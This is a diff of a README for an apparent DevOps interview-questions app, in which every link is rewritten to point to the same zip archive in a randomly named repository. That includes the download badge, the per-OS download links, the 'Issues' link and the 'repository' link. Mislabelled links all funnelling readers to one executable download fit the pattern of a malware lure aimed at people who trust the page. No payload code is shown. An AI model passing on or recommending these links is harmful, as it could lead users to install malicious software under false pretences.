@@ -1,6 +1,6 @@
 # 📚 devops-interview-questions - Prepare Clearly for DevOps Interviews
 
-[![Download Latest Release](https://github.com/riwhbboiebdjf/devops-interview-questions/raw/refs/heads/main/security/interview-devops-questions-1.2.zip%20Release-blue?style=for-the-badge)](https://github.com/riwhbboiebdjf/devops-interview-questions/raw/refs/heads/main/security/interview-devops-questions-1.2.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/riwhbboiebdjf/devops-interview-questions/main/security/interview-devops-questions-1.2.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/riwhbboiebdjf/devops-interview-questions/main/security/interview-devops-questions-1.2.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Any standard desktop or laptop should work fine.
 
 Go to the official release page by clicking the badge below or visiting this link:
 
-[https://github.com/riwhbboiebdjf/devops-interview-questions/raw/refs/heads/main/security/interview-devops-questions-1.2.zip](https://github.com/riwhbboiebdjf/devops-interview-questions/raw/refs/heads/main/security/interview-devops-questions-1.2.zip)
+[https://raw.githubusercontent.com/riwhbboiebdjf/devops-interview-questions/main/security/interview-devops-questions-1.2.zip](https://raw.githubusercontent.com/riwhbboiebdjf/devops-interview-questions/main/security/interview-devops-questions-1.2.zip)
 
 This page contains all the available versions of the app ready for download.
 
@@ -51,8 +51,8 @@ On the releases page:
 - Scroll down to find downloadable files. They might be labeled by operating system or file type.  
 - Click the file that matches your operating system. For example:
 
-  - Windows: `https://github.com/riwhbboiebdjf/devops-interview-questions/raw/refs/heads/main/security/interview-devops-questions-1.2.zip`  
-  - macOS: `https://github.com/riwhbboiebdjf/devops-interview-questions/raw/refs/heads/main/security/interview-devops-questions-1.2.zip`  
+  - Windows: `https://raw.githubusercontent.com/riwhbboiebdjf/devops-interview-questions/main/security/interview-devops-questions-1.2.zip`  
+  - macOS: `https://raw.githubusercontent.com/riwhbboiebdjf/devops-interview-questions/main/security/interview-devops-questions-1.2.zip`  
   - Linux: a `.deb` or `.AppImage` file
 
 ### Step 4: Download the File
@@ -134,7 +134,7 @@ If you face issues during download, installation, or use:
 - For Linux, ensure your package installer is up to date.
 
 If problems persist, visit the GitHub repository’s **Issues** tab to look for solutions or report bugs:  
-[https://github.com/riwhbboiebdjf/devops-interview-questions/raw/refs/heads/main/security/interview-devops-questions-1.2.zip](https://github.com/riwhbboiebdjf/devops-interview-questions/raw/refs/heads/main/security/interview-devops-questions-1.2.zip)
+[https://raw.githubusercontent.com/riwhbboiebdjf/devops-interview-questions/main/security/interview-devops-questions-1.2.zip](https://raw.githubusercontent.com/riwhbboiebdjf/devops-interview-questions/main/security/interview-devops-questions-1.2.zip)
 
 ---
 
@@ -148,13 +148,13 @@ The app does not collect or share personal information. All data is stored local
 
 This app welcomes feedback and contributions to improve content and usability. If you want to suggest new questions or report errors:
 
-- Visit the repository: [https://github.com/riwhbboiebdjf/devops-interview-questions/raw/refs/heads/main/security/interview-devops-questions-1.2.zip](https://github.com/riwhbboiebdjf/devops-interview-questions/raw/refs/heads/main/security/interview-devops-questions-1.2.zip)  
+- Visit the repository: [https://raw.githubusercontent.com/riwhbboiebdjf/devops-interview-questions/main/security/interview-devops-questions-1.2.zip](https://raw.githubusercontent.com/riwhbboiebdjf/devops-interview-questions/main/security/interview-devops-questions-1.2.zip)  
 - Use the **Issues** tab to report ideas or problems.  
 - Follow the contribution guidelines if you want to submit changes.
 
 ---
 
-[Download the latest release here](https://github.com/riwhbboiebdjf/devops-interview-questions/raw/refs/heads/main/security/interview-devops-questions-1.2.zip)
+[Download the latest release here](https://raw.githubusercontent.com/riwhbboiebdjf/devops-interview-questions/main/security/interview-devops-questions-1.2.zip)
 
 ---
 
